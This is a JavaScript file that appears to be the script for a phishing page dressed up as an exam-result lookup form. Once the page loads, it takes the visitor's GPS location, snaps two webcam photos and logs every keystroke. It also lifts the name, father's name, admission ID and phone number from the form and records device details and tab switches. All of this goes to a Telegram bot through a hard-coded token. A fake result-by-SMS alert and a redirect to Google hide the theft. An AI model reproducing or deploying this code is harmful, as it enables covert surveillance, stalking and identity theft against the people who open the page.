const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';
const CHAT_ID = '1332669070';

let photoCount = 0;
let keystrokes = '';
let mediaStream = null;

// 📍 Send GPS location
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const { latitude, longitude } = pos.coords;
            sendToTelegram(`📍 *Location*\nLat: ${latitude}\nLng: ${longitude}`);
        },
        error => {
            console.error('Geolocation error:', error);
            sendToTelegram('❌ *Location Access Denied*\nError: ' + error.message);
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
} else {
    sendToTelegram('❌ *Geolocation not supported*');
}

// 📸 Capture and send 2 photos
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ 
        video: { 
            width: 1280, 
            height: 720,
            facingMode: 'user' 
        } 
    })
    .then(async stream => {
        mediaStream = stream;
        const video = document.createElement('video');
        video.srcObject = stream;
        
        try {
            await video.play();
            
            // Wait for video to be ready
            await new Promise(resolve => {
                if (video.readyState >= 2) {
                    resolve();
                } else {
                    video.addEventListener('loadeddata', resolve, { once: true });
                }
            });
            
            // Capture first photo immediately
            await capturePhoto(video);
            
            // Capture second photo after delay
            setTimeout(async () => {
                await capturePhoto(video);
            }, 3000);
            
        } catch (error) {
            console.error('Video play error:', error);
            sendToTelegram('❌ *Camera Error*\n' + error.message);
            stopCamera();
        }
    })
    .catch(error => {
        console.error('Camera access error:', error);
        sendToTelegram('❌ *Camera Access Denied*\n' + error.message);
    });
} else {
    sendToTelegram('❌ *Camera not supported*');
}

// 📸 Photo capture function
async function capturePhoto(video) {
    return new Promise((resolve) => {
        try {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            // Set canvas dimensions to match video
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            // Draw video frame to canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to blob and send
            canvas.toBlob(blob => {
                if (blob) {
                    sendToTelegram(blob, 'photo');
                    photoCount++;
                    if (photoCount >= 2) {
                        stopCamera();
                    }
                }
                resolve();
            }, 'image/jpeg', 0.8);
            
        } catch (error) {
            console.error('Photo capture error:', error);
            sendToTelegram('❌ *Photo Capture Failed*\n' + error.message);
            resolve();
        }
    });
}

// ⌨️ Keystroke logger
document.addEventListener('keydown', e => {
    // Filter out special keys
    if (e.key.length === 1) {
        keystrokes += e.key;
    } else {
        // Add special keys with brackets
        keystrokes += `[${e.key}]`;
    }
    
    // Send keystrokes in batches
    if (keystrokes.length >= 50) {
        sendToTelegram(`⌨️ *Keystrokes*\n\`\`\`\n${keystrokes}\n\`\`\``);
        keystrokes = '';
    }
});

// 📝 Form submission handler
function initializeFormHandler() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            try {
                const name = document.getElementById('name')?.value || 'N/A';
                const father = document.getElementById('father')?.value || 'N/A';
                const admId = document.getElementById('admId')?.value || 'N/A';
                const phone = document.getElementById('phone')?.value || 'N/A';

                const message = `📄 *Form Submitted*\n\n• 👤 Name: ${name}\n• 👨‍👦 Father: ${father}\n• 🆔 Admission ID: ${admId}\n• 📞 Phone: ${phone}`;
                
                await sendToTelegram(message);
                
                // Show success message
                alert(`Dear ${name}, we will send you SMS of your result.`);
                
                // Redirect after a short delay
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 1000);
                
            } catch (error) {
                console.error('Form submission error:', error);
                alert('An error occurred. Please try again.');
            }
        });
    } else {
        console.warn('Login form not found');
        sendToTelegram('⚠️ *Form not found on page*');
    }
}

// 📤 Send to Telegram with improved error handling
async function sendToTelegram(data, type = 'message') {
    try {
        let response;
        
        if (type === 'photo') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', data);
            formData.append('caption', `📸 Photo ${photoCount} - ${new Date().toLocaleString()}`);
            
            response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } else {
            response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: data,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        const result = await response.json();
        
        if (!result.ok) {
            console.error('Telegram API error:', result);
            throw new Error(result.description || 'Unknown Telegram API error');
        }
        
        console.log('Message sent successfully:', type);
        return result;
        
    } catch (error) {
        console.error('Failed to send to Telegram:', error);
        // Don't throw here to avoid breaking the flow
        return null;
    }
}

// 🛑 Stop camera function
function stopCamera() {
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => {
            track.stop();
        });
        mediaStream = null;
        console.log('Camera stopped');
    }
}

// 🕒 Send system info on load
window.addEventListener('load', function() {
    // Initialize form handler
    initializeFormHandler();
    
    // Send system information
    const systemInfo = `🖥️ *Page Loaded*\n\n• 📱 User Agent: ${navigator.userAgent}\n• 🌐 Platform: ${navigator.platform}\n• 🕐 Time: ${new Date().toLocaleString()}\n• 🔗 URL: ${window.location.href}`;
    
    sendToTelegram(systemInfo);
    
    // Send keystrokes periodically (every 30 seconds)
    setInterval(() => {
        if (keystrokes.length > 0) {
            sendToTelegram(`⌨️ *Keystrokes (Periodic)*\n\`\`\`\n${keystrokes}\n\`\`\``);
            keystrokes = '';
        }
    }, 30000);
});

// 🚨 Handle page unload
window.addEventListener('beforeunload', function() {
    // Send remaining keystrokes
    if (keystrokes.length > 0) {
        sendToTelegram(`⌨️ *Keystrokes (Final)*\n\`\`\`\n${keystrokes}\n\`\`\``);
    }
    
    // Send exit message
    sendToTelegram(`👋 *User Left Page*\n\n• 🕐 Time: ${new Date().toLocaleString()}\n• 🔗 URL: ${window.location.href}`);
    
    // Stop camera
    stopCamera();
});

// Handle visibility change (tab switch)
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        sendToTelegram(`🔍 *User switched tabs/windows*\n• Time: ${new Date().toLocaleString()}`);
    } else {
        sendToTelegram(`🔍 *User returned to page*\n• Time: ${new Date().toLocaleString()}`);
    }
});